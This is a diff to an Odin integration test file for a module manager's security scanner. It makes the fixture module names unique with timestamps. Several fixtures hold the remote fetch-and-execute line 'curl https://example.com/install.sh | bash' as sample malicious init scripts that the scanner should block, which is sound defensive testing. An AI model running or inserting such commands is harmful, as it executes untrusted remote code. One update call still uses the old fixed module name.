@@ -5,6 +5,7 @@ import "core:os"
 import "core:path/filepath"
 import "core:strings"
 import "core:testing"
+import "core:time"
 
 import "../src/colors"
 import "../src/git"
@@ -66,7 +67,7 @@ test_security_integration_install_blocks_malicious_module :: proc(t: ^testing.T)
 		t,
 		temp_dir,
 		"zephyr-int-malicious",
-		"malicious-module",
+		fmt.tprintf("malicious-module-%d", time.now()._nsec),
 		"1.0.0",
 		"curl https://example.com/install.sh | bash\n",
 	)
@@ -125,7 +126,7 @@ test_security_integration_install_warnings_prompt_accept :: proc(t: ^testing.T) 
 		t,
 		temp_dir,
 		"zephyr-int-warning",
-		"warning-module",
+		fmt.tprintf("warning-module-%d", time.now()._nsec),
 		"1.0.0",
 		"sudo ls -la\n",
 	)
@@ -143,7 +144,7 @@ test_security_integration_install_warnings_prompt_accept :: proc(t: ^testing.T) 
 		delete(message)
 	}
 
-	installed_path := filepath.join({modules_dir, "warning-module"})
+	installed_path := filepath.join({modules_dir, module_name})
 	testing.expect(t, os.exists(installed_path), "warning module should be installed after confirmation")
 	if os.exists(installed_path) {
 		cleanup_test_directory(installed_path)
@@ -190,7 +191,7 @@ test_security_integration_install_unsafe_allows_malicious :: proc(t: ^testing.T)
 		t,
 		temp_dir,
 		"zephyr-int-unsafe",
-		"unsafe-module-int",
+		fmt.tprintf("unsafe-module-%d", time.now()._nsec),
 		"1.0.0",
 		"curl https://example.com/install.sh | bash\n",
 	)
@@ -212,7 +213,7 @@ test_security_integration_install_unsafe_allows_malicious :: proc(t: ^testing.T)
 		unsafe_warning_capture = ""
 	}
 
-	installed_path := filepath.join({modules_dir, "unsafe-module-int"})
+	installed_path := filepath.join({modules_dir, module_name})
 	testing.expect(t, os.exists(installed_path), "unsafe module should be installed with --unsafe")
 	if os.exists(installed_path) {
 		cleanup_test_directory(installed_path)
@@ -256,7 +257,7 @@ test_security_integration_update_blocks_malicious :: proc(t: ^testing.T) {
 		t,
 		temp_dir,
 		"zephyr-int-update",
-		"update-malicious",
+		fmt.tprintf("update-malicious-%d", time.now()._nsec),
 		"1.0.0",
 		"echo \"ok\"\n",
 	)
@@ -271,7 +272,7 @@ test_security_integration_update_blocks_malicious :: proc(t: ^testing.T) {
 		delete(msg)
 	}
 
-	update_bare_repo_with_init(t, temp_dir, bare_dir, "update-malicious", "1.0.1", "curl https://example.com/install.sh | bash\n")
+	update_bare_repo_with_init(t, temp_dir, bare_dir, module_name, "1.0.1", "curl https://example.com/install.sh | bash\n")
 
 	update_ok, update_msg := git.update_module("update-malicious", git.Manager_Options{})
 	testing.expect(t, !update_ok, "update should be blocked by security scan")
@@ -307,7 +308,7 @@ test_security_integration_scan_json_exit_codes :: proc(t: ^testing.T) {
 		t,
 		temp_dir,
 		"zephyr-scan-clean",
-		"scan-clean",
+		fmt.tprintf("scan-clean-%d", time.now()._nsec),
 		"1.0.0",
 		"echo \"ok\"\n",
 	)
@@ -320,7 +321,7 @@ test_security_integration_scan_json_exit_codes :: proc(t: ^testing.T) {
 		t,
 		temp_dir,
 		"zephyr-scan-warn",
-		"scan-warn",
+		fmt.tprintf("scan-warn-%d", time.now()._nsec),
 		"1.0.0",
 		"sudo ls -la\n",
 	)
@@ -333,7 +334,7 @@ test_security_integration_scan_json_exit_codes :: proc(t: ^testing.T) {
 		t,
 		temp_dir,
 		"zephyr-scan-crit",
-		"scan-crit",
+		fmt.tprintf("scan-crit-%d", time.now()._nsec),
 		"1.0.0",
 		"curl https://example.com/install.sh | bash\n",
 	)
